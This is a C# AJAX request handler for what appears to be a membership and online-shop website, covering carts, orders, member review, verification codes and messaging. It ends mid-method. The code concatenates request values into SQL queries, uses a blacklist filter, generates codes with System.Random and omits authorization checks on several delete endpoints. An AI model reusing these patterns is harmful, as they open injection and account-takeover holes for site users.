using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Web;
using System.Web.Security;
using CommonBLL;
using Newtonsoft.Json;

namespace yny_004.Web.AjaxM
{
    public partial class ajax : BasePage
    {
        protected Model.Member memberModel = null;
        protected new void Page_Load(object sender, EventArgs e)
        {
            try
            {
                memberModel = TModel == null ? BllModel.TModel : TModel;
            }
            catch
            {

            }
            if (!BLL.CommonBase.TestSql(Request.QueryString.ToString() + Request.Form.ToString()))
            {
                Response.Write("非法字符");
                return;
            }
            if (!string.IsNullOrEmpty(Request["type"]))
                Operation(Request["type"]);
        }

        protected void Operation(string ope)
        {
            switch (ope)
            {
                case "enterMember":
                    enterMember();
                    break;
                case "getMName":
                    getMName();
                    break;
                case "FindMJB":
                    FindMJB();
                    break;
                case "FindMGP":
                    FindMGP();
                    break;
                case "FindMHB":
                    FindMHB();
                    break;
                case "FindMCW":
                    FindMCW();
                    break;
                case "Login":
                    getLogin();
                    break;
                case "ShMember":
                    ShMember();
                    break;
                case "ShMemberSelf":
                    ShMemberSelf();
                    break;
                case "ShJZZMember":
                    ShJZZMember();
                    break;
                case "ShFTMember":
                    ShFTMember();
                    break;
                case "SHTX":
                    SHTX();
                    break;
                case "SHAllTX":
                    SHAllTX();
                    break;
                case "Cancel_TX":
                    Cancel_TX();
                    break;
                case "DeleteMember":
                    DeleteMember();
                    break;
                case "Del_MemberW":
                    DeleteMemberW();
                    break;
                case "getSecPsd":
                    GetSecPsd();
                    break;
                case "Verify":
                    Verify();
                    break;
                case "VerifyUrl":
                    VerifyUrl();
                    break;
                case "Del_ChangeMoney":
                    Del_ChangeMoney();
                    break;
                case "GetNotice":
                    GetNotice();
                    break;
                case "GetMessage":
                    GetMessage();
                    break;
                case "SendMessage":
                    SendMessage();
                    break;
                case "EndTask":
                    EndTask();
                    break;
                case "Del_Notice":
                    Del_Notice();
                    break;
                case "ShowNotice":
                    ShowNotice();
                    break;
                case "HideNotice":
                    HideNotice();
                    break;
                case "Del_Task":
                    DeleteTask();
                    break;
                case "ShowTask":
                    ShowTask();
                    break;
                case "HideTask":
                    HideTask();
                    break;
                case "ReadTask":
                    ReadTask();
                    break;
                case "NoReadTask":
                    NoReadTask();
                    break;
                case "FH":
                    FH();
                    break;
                case "SetVerify":
                    SetVerify();
                    break;
                case "shHKModel":
                    shHKModel();
                    break;
                case "del_HKModel":
                    deleteHKModel();
                    break;
                case "DeleteGoogs":
                    DeleteGoogs();
                    break;
                case "DeleteBank":
                    DeleteBank();
                    break;
                case "SendOrder":
                    SendOrder();
                    break;
                case "GrantVerify":
                    GrantVerify();
                    break;
                case "SendCode":
                    SendCode();
                    break;
                case "sendCode2":
                    sendCode2();
                    break;
                case "SendCodeModifySecPsd":
                    SendCodeModifySecPsd();
                    break;
                case "sendTelCodeForFindPwd":
                    sendTelCodeForFindPwd();
                    break;
                case "SendSMSTest":
                    SendSMSTest();
                    break;
                case "SendEmailTest":
                    SendEmailTest();
                    break;
                case "DeleteAccounts":
                    DeleteAccounts();
                    break;
                case "Accounts":
                    Accounts();
                    break;
                case "Recover":
                    Recover();
                    break;
                case "isCanChangeByMember":
                    IsCanChangeByMember();
                    break;
                case "checkPwdAnswer":
                    checkPwdAnswer();
                    break;
                case "CheckContentID":
                    CheckContentID();
                    break;
                case "DeleteLanguage":
                    DeleteLanguage();
                    break;
                case "BCenter":
                    BCenter();
                    break;
                case "Del_BCenter":
                    DeleteBCenter();
                    break;
                case "QuitSH":
                    QuitSH();
                    break;
                case "VerifyBase":
                    VerifyBase();
                    break;



                #region 商城

                case "AddShopCar"://从详细页面加入购物车
                    AddShopCar();
                    break;
                case "BatchAddShopCar"://从列表页加入购物车
                    BatchAddShopCar();
                    break;
                case "SubmitOrder"://提交订单
                    SubmitOrder();
                    break;
                case "sendOrder"://发货
                    sendOrder();
                    break;
                case "delOrder"://删除
                    delOrder();
                    break;
                case "receiveOrder"://收货
                    receiveOrder();
                    break;
                case "seeExpress"://查看订单物流信息
                    seeExpress();
                    break;
                case "UpdateShopCar"://修改购物车信息
                    UpdateShopCar();
                    break;
                case "DeleteReceiveInfo"://删除收货人信息
                    DeleteReceiveInfo();
                    break;
                    #endregion 商城

            }
        }

        #region 商城

        private object lockObj = new object();
        public void AddShopCar()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string gid = Request["pram"];
                    string count = Request["count"];
                    string pop = Request["pop"]; //pop=1，就是立即提交的订单
                    //先查看购物车中有没有该用户的该产品
                    Hashtable hs = new Hashtable();
                    Model.ShopCar car = BLL.ShopCar.GetList("IsDeleted=0 and Status=1 and MID='" + TModel.MID + "' and GId=" + gid).FirstOrDefault();
                    if (car != null)
                    {
                        car.GCount = car.GCount + int.Parse(count);
                        BLL.ShopCar.Update(car, hs);
                    }
                    else
                    {
                        car = new Model.ShopCar();
                        car.AddBy = TModel.MID;
                        car.AddTime = DateTime.Now;
                        car.Code = GetGuid();
                        car.GCount = int.Parse(count);
                        car.GId = int.Parse(gid);
                        car.IsDeleted = false;
                        car.MID = TModel.MID;
                        car.Status = 1;
                        car.BuyPrice = BLL.Goods.GetModel(gid).CostPrice;
                        BLL.ShopCar.Insert(car, hs);
                    }
                    if (!string.IsNullOrEmpty(pop) && pop == "1")
                    {

                    }

                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "1";
                    else
                        result = "0";
                }
                else
                {
                    result = "0";
                }
                Response.Write(result);
                return;
            }
        }

        public void UpdateShopCar()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string cid = Request["pram"];
                    string count = Request["count"];
                    //先查看购物车中有没有该用户的该产品
                    Hashtable hs = new Hashtable();
                    Model.ShopCar car = BLL.ShopCar.GetModel(cid);
                    if (car != null)
                    {
                        car.GCount = int.Parse(count);
                        BLL.ShopCar.Update(car, hs);
                    }

                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "1";
                    else
                        result = "0";
                }
                else
                {
                    result = "0";
                }
                Response.Write(result);
                return;
            }
        }

        public void BatchAddShopCar()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string gid = Request["pram"];
                    string count = "1";
                    //先查看购物车中有没有该用户的该产品
                    Hashtable hs = new Hashtable();
                    string[] array = gid.Split(',');
                    foreach (string str in array)
                    {
                        Model.ShopCar car = BLL.ShopCar.GetList("IsDeleted=0 and Status=1  and MID='" + TModel.MID + "' and GId=" + str).FirstOrDefault();
                        if (car != null)
                        {
                            car.GCount = car.GCount + int.Parse(count);
                            BLL.ShopCar.Update(car, hs);
                        }
                        else
                        {
                            car = new Model.ShopCar();
                            car.AddBy = TModel.MID;
                            car.AddTime = DateTime.Now;
                            car.Code = GetGuid();
                            car.GCount = int.Parse(count);
                            car.GId = int.Parse(str);
                            car.IsDeleted = false;
                            car.MID = TModel.MID;
                            car.Status = 1;
                            car.BuyPrice = BLL.Goods.GetModel(str).CostPrice;
                            BLL.ShopCar.Insert(car, hs);
                        }
                    }
                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "添加成功";
                    else
                        result = "添加失败";
                }
                else
                {
                    result = "添加失败";
                }
                Response.Write(result);
                return;
            }
        }


        public void SubmitOrder()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string gid = Request["pram"];
                    string receiveId = Request["otherParm"];
                    Hashtable hs = new Hashtable();
                    string[] array = gid.Split(',');
                    //先生成订单主表
                    Model.Order order = new Model.Order();
                    DateTime dt = DateTime.Now;
                    string code = dt.ToString("yyyyMMddHHmmssfff");// dt.Year.ToString() + dt.Month.ToString() + dt.Day.ToString() + dt.Hour.ToString() + dt.Minute.ToString() + dt.Second.ToString() + dt.Millisecond.ToString();
                    order.Code = code;
                    order.ReceiveId = int.Parse(receiveId);
                    order.CreatedBy = TModel.MID;
                    order.CreatedTime = DateTime.Now;
                    order.PayTime = DateTime.MaxValue;
                    //order.GoodCount
                    int count = 0; decimal totalMoney = 0;
                    string error = string.Empty;
                    foreach (string str in array)
                    {
                        Model.ShopCar car = BLL.ShopCar.GetModel(str);
                        if (car != null)
                        {
                            Model.OrderDetail od = new Model.OrderDetail();
                            od.BuyPrice = car.BuyPrice;
                            od.Code = GetGuid();
                            od.CreatedBy = TModel.MID;
                            od.CreatedTime = DateTime.Now;
                            od.GCount = car.GCount;
                            count += od.GCount;
                            od.GId = car.GId;
                            //查看库存数量是否足够，不够的话暂时不能提交订单
                            Model.Goods go = BLL.Goods.GetModel(car.GId);
                            if (go.SellingCount < car.GCount)
                            {
                                error += "商品：" + go.GName + "库存不足，请联系管理员";
                            }

                            od.IsDeleted = false;
                            od.OrderCode = order.Code;
                            od.Status = 1;
                            od.TotalMoney = od.GCount * od.BuyPrice;
                            totalMoney += od.TotalMoney;
                            BLL.OrderDetail.Insert(od, hs);
                            car.Status = 2;
                            BLL.ShopCar.Update(car, hs);
                        }
                    }
                    order.GoodCount = count;
                    order.IsDeleted = false;
                    order.MID = TModel.MID;
                    order.OrderTime = DateTime.Now;
                    order.Status = 1;
                    order.TotalPrice = totalMoney;
                    BLL.Order.Insert(order, hs);

                    if (!string.IsNullOrEmpty(error))
                    {
                        result = error;
                    }
                    else
                    {
                        if (BLL.CommonBase.RunHashtable(hs))
                            result = "订单提交成功";
                        else
                            result = "订单提交失败";
                    }
                }
                else
                {
                    result = "添加失败";
                }
                Response.Write(result);
                return;
            }



        }

        public void sendOrder()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string orderid = Request["pram"];
                    string expresscompany = Request["com"];
                    string expresscode = Request["code"];
                    Hashtable hs = new Hashtable();
                    Model.Order order = BLL.Order.GetModel(orderid);
                    if (orderid != null)
                    {
                        order.Status = 3;
                        order.ExpressCode = expresscode;
                        order.ExpressCompany = expresscompany;
                        BLL.Order.Update(order, hs);
                    }
                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "1";
                    else
                        result = "0";
                }
                else
                {
                    result = "0";
                }
                Response.Write(result);
                return;
            }
        }

        public void receiveOrder()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string orderid = Request["pram"];
                    Hashtable hs = new Hashtable();
                    Model.Order order = BLL.Order.GetModel(orderid);
                    if (orderid != null)
                    {
                        order.Status = 4;
                        BLL.Order.Update(order, hs);
                    }
                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "1";
                    else
                        result = "0";
                }
                else
                {
                    result = "0";
                }
                Response.Write(result);
                return;
            }
        }

        public void delOrder()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string orderid = Request["pram"];
                    Hashtable hs = new Hashtable();
                    Model.Order order = BLL.Order.GetModel(orderid);

                    if (order.Status == 1)
                    {
                        order.IsDeleted = true;
                        BLL.Order.Update(order, hs);
                    }
                    else if (order.Status == 2)
                    {
                        order.IsDeleted = true;
                        BLL.Order.Update(order, hs);
                        if (!string.IsNullOrEmpty(order.MoneyType))
                        {
                            BLL.ChangeMoney.HBChangeTran(order.TotalPrice, BLL.Member.ManageMember.TModel.MID, order.MID, "GWFH", null, order.MoneyType, order.Id.ToString(), hs);
                        }

                        foreach (Model.OrderDetail od in order.OrderDetail)
                        {
                            Model.Goods good = BLL.Goods.GetModel(od.GId);
                            if (good != null)
                            {
                                good.SelledCount = good.SelledCount + od.GCount;
                                good.SellingCount = good.SellingCount - od.GCount;
                                BLL.Goods.Update(good, hs);
                            }
                        }
                    }
                    else
                    {
                        Response.Write("0");
                        return;
                    }


                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "1";
                    else
                        result = "0";
                }
                else
                {
                    result = "0";
                }
                Response.Write(result);
                return;
            }
        }

        public void seeExpress()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    string orderid = Request["pram"];
                    Model.Order order = BLL.Order.GetModel(orderid);
                    if (orderid != null)
                    {
                        result += order.ExpressCode + "≌";
                        result += order.ExpressCompany;
                    }
                }
                else
                {
                    result = "0";
                }
                Response.Write(result);
                return;
            }
        }


        public void DeleteReceiveInfo()
        {
            lock (lockObj)
            {
                string result = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    Hashtable hs = new Hashtable();
                    string orderid = Request["pram"];
                    string[] array = orderid.Split(',');
                    foreach (string str in array)
                    {
                        Model.ReceiveInfo order = BLL.ReceiveInfo.GetModel(str);
                        if (orderid != null)
                        {
                            order.IsDeleted = true;
                            BLL.ReceiveInfo.Update(order, hs);
                        }
                    }
                    if (BLL.CommonBase.RunHashtable(hs))
                        result = "删除成功";
                    else
                        result = "数据有误";
                }
                else
                {
                    result = "参数有误";
                }
                Response.Write(result);
                return;
            }
        }

        # endregion 商城
        private void VerifyBase()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    string url = Request["pram"];
                    if (url.Contains('?'))
                    {
                        int index = url.IndexOf('?');
                        url = url.Substring(0, index);
                    }

                    bool restr = BLL.Roles.VerifyPower(TModel, url.ToUpper());
                    if (restr)
                    {
                        Response.Write("TRUE");
                        return;
                    }
                    else
                    {
                        Response.Write("FALSE");
                        return;
                    }

                }
                catch (Exception ex)
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private static object BCObj = new object();

        /// <summary>
        /// 报单中心
        /// </summary>
        private void BCenter()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                if (TModel.Role.IsAdmin)
                {
                    lock (BCObj)
                    {
                        try
                        {
                            List<string> shmid = Request["pram"].Split(',').ToList();
                            int success = 0, fail = 0;
                            string errorStr = "";
                            foreach (string mid in shmid)
                            {
                                Model.Agents bc = BLL.Agents.GetModel(int.Parse(mid));
                                if (bc != null && bc.IsValid == 0)
                                {
                                    string result = BLL.Agents.SHAgent(bc);
                                    if (!string.IsNullOrEmpty(result))
                                    {
                                        fail++;
                                        errorStr += bc.MID + ":(" + result + ");";
                                        continue;
                                    }
                                    else
                                    {
                                        success++;
                                    }
                                }
                            }
                            if (fail > 0)
                            {
                                Response.Write("成功：" + success + ";失败：" + fail + ";失败原因:" + errorStr);
                            }
                            else
                            {
                                Response.Write("成功：" + success + ";失败：" + fail + ";");
                            }
                            return;
                        }
                        catch (Exception ex)
                        {
                            Response.Write(ex.Message);
                            return;
                        }
                    }
                }
                else
                {
                    Response.Write("您没有权限");
                    return;
                }
            }
            else
            {
                Response.Write("参数异常");
                return;
            }
        }

        /// <summary>
        /// 删除报单中心
        /// </summary>
        /// <param name="mid"></param>
        /// <returns></returns>
        public void QuitSH()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                Response.Write(BLL.QuitRecord.QuitSH((Request["pram"]), TModel));
                return;
            }
            Response.Write("参数错误");
            return;
        }
        /// <summary>
        /// 删除报单中心
        /// </summary>
        /// <param name="mid"></param>
        /// <returns></returns>
        public void DeleteBCenter()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                Response.Write(BLL.BCenter.DeleteBCenter((Request["pram"])));
                return;
            }
            Response.Write("");
            return;
        }
        /// <summary>
        /// 校验ContentID是否有重复的
        /// </summary>
        protected void CheckContentID()
        {
            string result = "";
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                Model.Contents obj = BLL.Contents.GetModel(Request["pram"]);
                if (obj != null)
                {
                    result = "0";//不通过
                }
                else
                    result = "1";//通过
            }
            Response.Write(result);
            return;
        }
        protected void DeleteLanguage()
        {
            string result = "";
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                result = Sys_LanguageBLL.Delete(Request["pram"]);
            }
            Response.Write(result);
            return;
        }


        /// <summary>
        /// 校验密保问题是否正确
        /// </summary>
        protected void checkPwdAnswer()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                string question = Request["question"];
                string answer = Request["answer"];
                if (string.IsNullOrEmpty(question))
                {
                    Response.Write("-1");//参数错误
                    return;
                }
                else
                {
                    Model.Sys_SecurityQuestion objQues = new BLL.Sys_SecurityQuestion().GetModel(question);
                    List<Model.Sys_SQ_Answer> listAns = new BLL.Sys_SQ_Answer().GetList(" MID=" + memberModel.ID + " and IsDeleted=0 and QId=" + objQues.ID.ToString());
                    if (listAns != null && listAns.Count > 0)
                    {
                        string orgAns = listAns[0].Answer;
                        if (answer == orgAns)
                        {
                            Response.Write("1"); //验证通过
                            return;
                        }
                        else
                        {
                            Response.Write("0");//密保问题不正确
                            return;
                        }
                    }
                    else
                    {
                        Response.Write("2");//未设置密保问题
                        return;
                    }
                }
            }
            Response.Write("0");
            return;
        }

        private void Recover()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.Recover((Request["pram"])));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void Accounts()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BLL.Member.Accounts(Request["pram"]));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void DeleteAccounts()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    if (BLL.Accounts.Delete(Request["pram"]))
                        Response.Write("操作成功");
                    else
                        Response.Write("操作失败");
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void SendOrder()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.SendOrder((Request["pram"])));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void DeleteGoogs()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.DeleteGoogs((Request["pram"])));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void DeleteBank()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    string[] banks = Request["pram"].Split(',');
                    Hashtable MyHs = new Hashtable();
                    List<string> member = new List<string>();
                    foreach (string item in banks)
                    {
                        Model.BankModel bank = BLL.BankModel.GetModel(item);
                        if (!memberModel.Role.Super)
                        {
                            if (bank.MID == memberModel.MID)
                            {
                                BLL.BankModel.Delete(item, MyHs);
                            }
                        }
                        else
                        {
                            BLL.BankModel.Delete(item, MyHs);
                        }
                        if (!member.Contains(bank.MID))
                            member.Add(bank.MID);
                    }
                    if (BLL.CommonBase.RunHashtable(MyHs))
                    {
                        MyHs.Clear();
                        foreach (string mid in member)
                        {
                            List<Model.BankModel> list = BLL.BankModel.GetList("MID='" + mid);
                            if (list.Count > 0)
                            {
                                BLL.BankModel.Update(list[0]);
                            }
                            else
                            {
                                Model.Member model = BllModel.GetModel(mid);
                                model.Bank = "";
                                model.Branch = "";
                                model.BankNumber = "";
                                model.BankCardName = "";
                                BllModel.UpdateBankInfo(model, MyHs);
                            }
                        }
                        Response.Write("操作成功");
                    }
                    else
                        Response.Write("操作失败");
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void sendCode2()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    string TelCode = new Random().Next(421339, 999999).ToString();
                    string Msg = "尊敬的会员：您好，您的邮箱验证码为[" + TelCode + "]，请及时注册，谢谢![" + BLL.WebBase.Model.EmailTitle + "]";
                    Model.SMS model = new Model.SMS { SType = Model.SMSType.ZCYZ, Email = Request["pram"], SContent = Msg, SMSKey = TelCode };
                    string error = "";
                    if (BLL.Email.Insert(model, ref error))
                    {
                        Msg = "尊敬的会员：" + memberModel.MID + "，您推广的新会员的邮箱验验证码已成功发送至他的邮箱,请通知他注意查收!";
                        BLL.Task.ManageSend(memberModel, Msg);
                        Response.Write("发送成功");
                    }
                    else
                    {
                        Response.Write(error);
                    }

                }
                catch
                {
                    Response.Write("发送失败");
                }
                return;
            }
            Response.Write("请输入邮箱");
            return;
        }

        private void SendEmailTest()
        {
            Model.SMS model = new Model.SMS { SType = Model.SMSType.CSYX, Email = BLL.WebBase.Model.MonitorEmail, SContent = "测试" };
            string error = "";
            if (BLL.Email.Insert(model, ref error))
                Response.Write("发送成功，请注意查收");
            else
                Response.Write(error);
            return;
        }

        private void SendSMSTest()
        {
            Model.SMS model = new Model.SMS { SType = Model.SMSType.CSDX, Tel = BLL.WebBase.Model.MonitorTel, SContent = "测试" };
            string error = "";
            if (BLL.SMS.Insert(model, ref error))
            {
                Response.Write("发送成功，请注意查收");
            }
            else
                Response.Write(error);
            return;
        }
        private void sendTelCodeForFindPwd()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                string tel = Request["pram"];
                string mid = Request["txtMID"];
                Model.Member member = BLL.Member.GetModelByMID(mid);
                if (member == null)
                {
                    Response.Write("未找到账号");
                    return;
                }
                if (member.Tel != tel)
                {
                    Response.Write("输入账号的手机号跟所填手机号不一致");
                    return;
                }

                try
                {
                    string TelCode = new Random().Next(421339, 999999).ToString();
                    string Msg = "尊敬的会员：您好，您的手机验证码为[" + TelCode + "]，请及时重置密码，谢谢!";
                    Model.SMS model = new Model.SMS { SType = Model.SMSType.CZMM, Tel = tel, SContent = Msg, SMSKey = TelCode };
                    string error = "";
                    if (BLL.SMS.Insert(model, ref error))
                    {
                        //Msg = "尊敬的会员：" + memberModel.MID + "，您推广的新会员的手机验证码已成功发送至他的手机,请通知他注意查收!";
                        //BLL.Task.ManageSend(memberModel, Msg);
                        Response.Write("发送成功");
                    }
                    else
                    {
                        Response.Write(error);
                    }
                }
                catch
                {
                    Response.Write("发送失败");
                }
                return;
            }
            Response.Write("请输入手机号码");
            return;
        }
        private void SendCodeModifySecPsd()
        {
            try
            {
                string TelCode = new Random().Next(421339, 999999).ToString();
                string Msg = "尊敬的会员：" + memberModel.MID + ",您好，您的验证码为[" + TelCode + "]，请及时修改资金密码，谢谢!";
                Model.SMS model = new Model.SMS { SType = Model.SMSType.MMYZ, Email = memberModel.Email, Tel = memberModel.Tel, SContent = Msg, SMSKey = TelCode, MID = memberModel.MID };
                string error = "";
                if (BLL.SMS.Insert(model, ref error) || BLL.Email.Insert(model, ref error))
                {
                    Msg = "尊敬的会员：" + memberModel.MID + "，您修改资金密码的验证码已成功发送至您的手机或邮箱,请注意查收!";
                    BLL.Task.ManageSend(memberModel, Msg);
                    Response.Write("发送成功");
                }
                else
                    Response.Write(error);

            }
            catch
            {
                Response.Write("发送失败");
            }
            return;
        }

        private void SendCode()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    string TelCode = new Random().Next(421339, 999999).ToString();
                    string Msg = "尊敬的会员：您好，您的手机验证码为[" + TelCode + "]，请及时注册，谢谢!";
                    Model.SMS model = new Model.SMS { SType = Model.SMSType.ZCYZ, Tel = Request["pram"], SContent = Msg, SMSKey = TelCode };
                    string error = "";
                    if (BLL.SMS.Insert(model, ref error))
                    {
                        //Msg = "尊敬的会员：" + memberModel.MID + "，您推广的新会员的手机验证码已成功发送至他的手机,请通知他注意查收!";
                        //BLL.Task.ManageSend(memberModel, Msg);
                        Response.Write("发送成功");
                    }
                    else
                    {
                        Response.Write(error);
                    }
                }
                catch
                {
                    Response.Write("发送失败");
                }
                return;
            }
            Response.Write("请输入手机号码");
            return;
        }
        private void GrantVerify()
        {
            if (!string.IsNullOrEmpty(Request["pram"]) && !string.IsNullOrEmpty(Request.Params["mType"]))
            {
                try
                {
                    Response.Write(BllModel.GrantVerify(Request["pram"], Request.Params["mType"]));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void deleteHKModel()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.DeleteHKModel((Request["pram"])));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void shHKModel()
        {
            if (!string.IsNullOrEmpty(Request["pram"]) && memberModel.Role.Super)
            {
                try
                {
                    var result = BllModel.SHHKModel((Request["pram"]));
                    BLL.OperationRecordBLL.Add(TModel.MID, ChangeType.O_SHXXHK, "审核线下汇款");
                    Response.Write(result);
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void SetVerify()
        {
            if (!string.IsNullOrEmpty(Request["pram"]) && !string.IsNullOrEmpty(Request.Params["mType"]))
            {
                try
                {
                    Response.Write(BllModel.SetVerify(Request["pram"], Request.Params["mType"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void NoReadTask()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.NoReadTask(Request["pram"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void ReadTask()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.ReadTask(Request["pram"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void HideTask()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.HideTask(Request["pram"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }

        private void ShowTask()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.ShowTask(Request["pram"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("参数异常");
            return;
        }


        private void FH()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    string[] fhinfo = Request["pram"].Split('|');
                    //Model.FHList fhmodel = new Model.FHList()
                    //{
                    //    SumFHMoney = int.Parse(fhinfo[0]),
                    //    FHTotal = 0,
                    //    FHFloat = decimal.Parse(fhinfo[1]),
                    //    FHDate = DateTime.Now,
                    //    FHType = Model.ChangeType.YJFH,
                    //};
                    //Response.Write(BLL.FH(fhmodel, true));
                    return;

                }
                catch (Exception ex)
                {
                    Response.Write(ex.Message);
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void HideNotice()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.HideNotice(Request["pram"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void ShowNotice()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.ShowNotice(Request["pram"]));
                    return;

                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void Del_Notice()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.DeleteNotice(Request["pram"]));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }
        private void DeleteTask()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    Response.Write(BllModel.DeleteTask(Request["pram"]));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void EndTask()
        {
            try
            {
                if (!string.IsNullOrEmpty(Request["pram"]))
                {
                    Response.Write(BLL.Task.EndTask(Request["pram"], memberModel.MID));
                    return;
                }
                Response.Write("");
            }
            catch
            {
                Response.Write("");
                return;
            }
        }

        private void SendMessage()
        {
            try
            {
                Model.Task model = new Model.Task()
                {
                    TContent = HttpUtility.UrlDecode(Request["TContent"]),
                    TFromMID = memberModel.MID,
                    TFromMName = memberModel.MName,
                    TDateTime = DateTime.Now,
                    TToMID = HttpUtility.UrlDecode(Request["TToMID"]),
                    TToMName = HttpUtility.UrlDecode(Request["TToMName"]),
                    TType = "007"
                };
                Response.Write(BLL.Task.Add(model));
                return;
            }
            catch
            {
                Response.Write("");
                return;
            }
        }

        private void GetMessage()
        {
            try
            {
                string TFromMID = "";
                if (!string.IsNullOrEmpty(Request["pram"]))
                    TFromMID = Request["pram"];
                int ID = 0;
                if (!string.IsNullOrEmpty(Request["TaskID"]))
                    ID = int.Parse(Request["TaskID"]);
                List<Model.Task> modelList = BLL.Task.SelectNewTasks(memberModel.MID, TFromMID, ID);

                string retstr = "";
                if (modelList.Count > 0)
                {
                    retstr = JavaScriptConvert.SerializeObject(modelList);
                }
                Response.Write(retstr);
                Response.End();
                return;
            }
            catch
            {
                Response.Write("");
                Response.End();
                return;
            }
        }

        private void GetNotice()
        {
            try
            {
                BLL.Member.AddOnLine(memberModel.MID);
                Model.Notice model = BLL.Notice.GetNewNotice(7);
                string retstr = "";
                if (model != null)
                {
                    var info = new { ID = model.ID, Content = model.NContent };
                    retstr = JavaScriptConvert.SerializeObject(info);
                }
                Response.Write(retstr);
                return;
            }
            catch
            {
                Response.Write("");
                return;
            }
        }

        private void Del_ChangeMoney()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
                {
                    //
                    Response.Write(BllModel.Del_ChangeMoney(Request["pram"]));
                    return;
                }
                catch
                {
                    Response.Write("");
                    return;
                }
            }
            Response.Write("");
            return;
        }

        private void Verify()
        {
            if (!string.IsNullOrEmpty(Request["pram"]))
            {
                try
